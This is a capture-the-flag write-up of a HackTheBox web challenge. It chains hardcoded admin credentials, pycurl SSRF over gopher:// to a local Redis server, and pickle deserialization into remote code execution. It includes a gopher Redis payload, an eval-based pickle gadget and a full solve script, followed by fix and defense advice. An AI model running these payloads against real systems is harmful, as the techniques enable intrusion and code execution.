---
layout: post
title: "TrapTrack"
date: 2028-02-07 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, ssrf, gopher, pycurl, redis, pickle, deserialization, rce]
---

## Overview

TrapTrack is a Medium Web challenge: a Flask app where an authenticated user registers "trap tracks" (a name + URL), and a background worker periodically health-checks each URL with **pycurl**. Jobs live in Redis as base64-encoded **pickle** blobs. Three weaknesses chain into remote code execution and a read of the setuid-root `/readflag`.

## The technique

Three facts, from the source:

1. The admin login is hardcoded `admin:admin` (`config.py`).
2. The worker fetches the user-supplied `trap_url` with pycurl and sets **no `CURLOPT_PROTOCOLS`**, so libcurl accepts `gopher://` directly — [SSRF](https://cwe.mitre.org/data/definitions/918.html) to the local Redis (127.0.0.1:6379).
3. Both the worker and the route `/api/tracks/<id>/status` run `pickle.loads(base64.b64decode(redis.hget('jobs', id)))` — [deserialization of untrusted data](https://cwe.mitre.org/data/definitions/502.html). Control that Redis value and you control a pickle.

**Step 1 — log in.** `POST /api/login {"username":"admin","password":"admin"}`.

**Step 2 — SSRF to Redis via gopher.** Register a trap whose URL is a gopher payload that speaks the Redis protocol, planting an evil pickle under a job id we choose:

```
gopher://127.0.0.1:6379/_HSET%20jobs%2031337%20<url-encoded base64 pickle>%0D%0A
```

The worker fetches it, and Redis executes the inline `HSET`. (The `_` after the port is the throwaway gopher item-type char; `%0D%0A` ends the command.)

**Step 3 — pickle RCE that echoes the flag.** The status route *returns whatever `pickle.loads` produced* as JSON, so make the pickle evaluate to the command output:

```python
class E:
    def __reduce__(self):
        return (eval, ("__import__('os').popen('/readflag').read()",))
```

`GET /api/tracks/31337/status` → the server unpickles → `eval(...)` runs the setuid-root `/readflag` → the returned value is the flag string → the endpoint hands it straight back.

## Solution

```python
import sys, time, pickle, base64, urllib.parse, requests, re
base = f"http://{sys.argv[1]}:{sys.argv[2]}"; s = requests.Session()
class E:
    def __reduce__(self):
        return (eval, ("__import__('os').popen('/readflag').read()",))
JOB = "31337"
b64 = base64.b64encode(pickle.dumps(E())).decode()
gopher = "gopher://127.0.0.1:6379/_" + urllib.parse.quote(f"HSET jobs {JOB} {b64}\r\n", safe="")
s.post(base+"/api/login", json={"username":"admin","password":"admin"})
s.post(base+"/api/tracks/add", json={"trapName":"x","trapURL":gopher})   # worker fetches -> plants pickle
for _ in range(10):
    time.sleep(6)
    r = s.get(base+f"/api/tracks/{JOB}/status")
    m = re.search(r"HTB\{[^}]+\}", r.text)
    if m: print("FLAG:", m.group(0)); break
```

## Why it worked

- **pycurl with default protocols** is a much stronger SSRF primitive than `requests`: `gopher://` sends arbitrary TCP payloads — here, Redis commands — with no redirect gadget needed. The app never validated the URL's scheme or host.
- **Untrusted Redis data is deserialized with `pickle`**, which is RCE by construction. Once SSRF lets us write the `jobs` hash, we own the deserializer — and a status route that returns the deserialized object turns blind RCE into a clean in-band flag read.

## Fix / defense

- Never deserialize untrusted data with `pickle` — use JSON (or a validated schema) for job payloads and treat cache/queue contents as untrusted.
- Restrict the fetcher: `CURLOPT_PROTOCOLS = http,https`, block `gopher`/`dict`/`file`, validate the URL scheme, and resolve-and-block internal IP ranges.
- Put Redis behind auth / a unix socket / network isolation, and don't leave a secret-reading setuid binary reachable from an RCE. Replace `admin:admin` with real credentials.
